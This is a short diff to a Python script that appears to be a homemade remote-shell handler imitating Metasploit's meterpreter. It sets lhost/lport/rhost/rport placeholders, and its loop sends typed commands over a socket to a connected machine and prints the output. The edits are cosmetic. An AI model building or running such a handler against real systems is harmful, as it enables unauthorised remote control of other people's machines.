@@ -23,13 +23,13 @@ print("")
 print("type help")
 print("")
 
-lhost = 'null bytes'
-lport = 'null bytes'
+lhost = 'null'
+lport = 'null'
 
 rhost = 'null'
 rport = 'null'
 
-filename = 'null bytes '
+filename = 'null'
 
 session = True
 while session:
@@ -189,9 +189,9 @@ while True:
 
 		session_door = True
 
-		while session_door:
+		while True:
 
-		      sys.stdout.write("session_meterpreter > ")
+		      sys.stdout.write("meterpreter > ")
 		      command = sys.stdin.readline()
 
 		      if command == 'exit\n':
@@ -203,5 +203,6 @@ while True:
 		      elif command != '\n':
 		          conn.send(command.encode())
 		          output = conn.recv(1024)
-		          print("\n",output,"\n")
-
+		          print("")
+		          print(output)
+		          print("")
